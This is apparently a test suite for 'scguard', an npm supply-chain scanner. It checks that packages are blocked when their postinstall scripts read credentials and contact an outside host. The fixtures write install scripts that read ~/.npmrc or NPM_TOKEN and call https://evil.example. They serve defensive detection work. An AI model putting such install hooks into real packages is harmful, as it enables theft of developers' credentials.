import { describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { analyzeDirectory, referencedLocalScriptFiles } from "./analysis";
import { buildVerdict } from "./verdict";

describe("decision-first verdict", () => {
  test("blocks install-time credential exfiltration reached through local script", async () => {
    const dir = await mkdtemp(join(tmpdir(), "scguard-verdict-"));
    try {
      await mkdir(join(dir, "scripts"), { recursive: true });
      await writeFile(
        join(dir, "package.json"),
        JSON.stringify({
          name: "reachable-evil",
          version: "1.0.0",
          scripts: { postinstall: "node scripts/install.js" },
        }),
      );
      await writeFile(
        join(dir, "scripts", "install.js"),
        "const fs = require('fs'); const https = require('https'); fs.readFileSync(process.env.HOME + '/.npmrc'); https.request('https://evil.example');",
      );
      const report = await analyzeDirectory(
        "reachable-evil@1.0.0",
        "npm",
        dir,
        "local",
      );
      expect(report.verdict.verdict).toBe("block");
      expect(report.verdict.installAllowed).toBe(false);
      expect(report.verdict.categories).toContain("install-time execution");
      expect(
        report.findings.some((finding) =>
          finding.id.includes("install-reachable.scripts/install.js"),
        ),
      ).toBe(true);
      expect(
        report.findings.some((finding) =>
          finding.id.includes("credential-access"),
        ),
      ).toBe(true);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test("review verdict exposes Safe Resolver next action", () => {
    const verdict = buildVerdict({
      target: "demo@1.2.0",
      kind: "npm",
      findings: [],
      intelligence: {
        packageAge: { status: "checked", versionAgeHours: 2 },
      },
      policy: {
        preset: "default",
        safeResolver: "suggest",
        scanReason: "direct-review",
        safeResolverSuggestion: {
          status: "suggested",
          message:
            "Safe Resolver suggests demo@1.1.0 instead of the freshly published 1.2.0.",
          requested: "^1.0.0",
          resolved: "1.2.0",
          suggested: "1.1.0",
          freshnessWindowHours: 168,
        },
      },
    });
    expect(verdict.verdict).toBe("review");
    expect(verdict.safeResolver?.command).toBe("scguard review demo@1.1.0");
    expect(verdict.exactNextAction).toBe("scguard review demo@1.1.0");
  });

  test("block verdict does not use Safe Resolver as next action", () => {
    const verdict = buildVerdict({
      target: "demo@1.2.0",
      kind: "npm",
      findings: [
        {
          id: "script.postinstall.credential-access",
          title: "Credential access in install script",
          severity: "high",
          evidence: "postinstall reads NPM_TOKEN",
          recommendation: "Do not install.",
        },
      ],
      intelligence: {
        packageAge: { status: "checked", versionAgeHours: 2 },
      },
      policy: {
        preset: "default",
        safeResolver: "suggest",
        scanReason: "direct-review",
        safeResolverSuggestion: {
          status: "suggested",
          message:
            "Safe Resolver suggests demo@1.1.0 instead of the freshly published 1.2.0.",
          requested: "^1.0.0",
          resolved: "1.2.0",
          suggested: "1.1.0",
          freshnessWindowHours: 168,
        },
      },
    });
    expect(verdict.verdict).toBe("block");
    expect(
      verdict.exactNextAction.startsWith("Do not install demo@1.2.0"),
    ).toBe(true);
  });

  test("extracts local lifecycle script references", () => {
    expect(
      referencedLocalScriptFiles(
        "node scripts/install.js && sh ./scripts/post.sh",
      ).sort(),
    ).toEqual(["scripts/install.js", "scripts/post.sh"]);
  });

  test("does not inspect install-reachable files outside package root", async () => {
    const dir = await mkdtemp(join(tmpdir(), "scguard-verdict-root-"));
    try {
      await mkdir(join(dir, "pkg", "scripts"), { recursive: true });
      await writeFile(
        join(dir, "pkg", "package.json"),
        JSON.stringify({
          name: "root-boundary",
          version: "1.0.0",
          scripts: { postinstall: "node scripts/../../outside.js" },
        }),
      );
      await writeFile(
        join(dir, "outside.js"),
        "process.env.NPM_TOKEN; fetch('https://evil.example')",
      );
      const report = await analyzeDirectory(
        "root-boundary@1.0.0",
        "npm",
        join(dir, "pkg"),
        "local",
      );
      expect(
        report.findings.some((finding) =>
          finding.id.includes("install-reachable"),
        ),
      ).toBe(false);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});
